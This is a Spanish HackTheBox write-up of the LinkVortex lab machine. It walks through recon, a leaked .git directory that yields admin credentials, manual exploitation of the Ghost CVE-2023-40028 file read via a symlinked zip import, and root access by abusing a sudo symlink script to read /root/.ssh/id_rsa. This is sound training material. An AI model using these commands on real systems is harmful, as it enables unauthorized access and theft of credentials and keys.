---
title: "LinkVortex"
date: 2025-05-29 16:41:33 +0200
categories: writeups HackTheBox
tags: máquina linux infoleak cve ghost lfi
description: Writeup de la máquina LinkVortex de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

Texto

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330221638.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.47`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.47 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330221602.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.47 -oN targeted
```

En el segundo escaneo de **Nmap**, lo que más nos llamará la atención es la existencia del subdominio **linkvortex.htb**.

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330221658.png>)

___
### Puerto 80 - HTTP (Apache)

debemos de añadir al `/etc/hosts` lo siguiente `linkvortex.htb`, de esta forma estaremos aplicando **Virtual Hosting**

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330222212.png>)

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330222224.png>)

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330222304.png>)

**Gobuster** 

```bash
gobuster vhost -u http://linkvortex.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --append-domain
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330222556.png>)

`/etc/hosts` a `10.10.11.47 linkvortex.htb dev.linkvortex.htb`

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330222525.png>)

```bash
gobuster dir -u http://dev.linkvortex.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330224220.png>)
### Git-Leaks (Git-Dumper)

[Git-Dumper](https://github.com/arthaud/git-dumper)

```bash
python3 git_dumper.py http://dev.linkvortex.htb/.git/ ../git/
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330225008.png>)

veremos un montón de credenciales inválidas, pero las que realmente nos valdrán serán **admin\@linkvortex.htb:OctopiFociPilfer45**

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330232121.png>)


___
## Explotación
### CVE-2023-40028 LFI
#### Automated

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330232521.png>)

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330232711.png>)

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330232808.png>)
#### Manual

```bash
pushd $(mktemp -d)
mkdir -p exploit/content/images/2024
ln -sf /var/lib/ghost/config.production.json $(pwd)/exploit/content/images/2024/trr0r.png
```

```bash
curl -b "ghost-admin-api-session=s:g9Tcj3d7vsb_4lU3KK7-2p1Ex5Wt7fdU.ZuD27pBlpBZg8PECOMTQnxcZguStf9Y1bVpZEXTU1ew" \
    -H "Accept: text/plain, */*; q=0.01" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "X-Ghost-Version: 5.58" \
    -H "App-Pragma: no-cache" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Content-Type: multipart/form-data" \
    -X POST \
    -H "Origin: " \
    -H "Referer: http://linkvortex.htb/ghost/" \
    -F "importfile=@exploit.zip;type=application/zip" \
    "http://linkvortex.htb/ghost/api/v3/admin/db"
```

```bash
curl -s -b "ghost-admin-api-session=ghost-admin-api-session=s:g9Tcj3d7vsb_4lU3KK7-2p1Ex5Wt7fdU.ZuD27pBlpBZg8PECOMTQnxcZguStf9Y1bVpZEXTU1ew" http://linkvortex.htb/content/images/2024/trr0r.png
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250405160553.png>)

```bash
ssh bob@linkvortex.htb
```

___
## Escalada de privilegios
### Enumeración local

Veremos que nos conectaremos correctamente, por lo que habremos ganado acceso a la máquina víctima como **martin**, además debemos de cambiar nuestra variable de entorno **TERM** (`export TERM=xterm`) para poder limpiar la pantalla, es decir poder hacer un <kbd>CTRL</kbd>+<kbd>L</kbd>.

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330234229.png>)

**Sudoers**

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330234354.png>)
### /opt/ghost/clean_symlink.sh |Sudoers

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330234729.png>)

```bash
sudo CHECK_CONTENT=true bash /opt/ghost/clean_symlink.sh test.png
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330234719.png>)

```bash
ln -sf /root/.ssh/id_rsa trr0r
ln -sf /home/bob/trr0r test.png
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330234832.png>)

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330234927.png>)

```bash
ssh -i id_rsa root@localhost
```

![](<../assets/images/posts/2025-05-29-linkvortex/Pasted image 20250330235008.png>)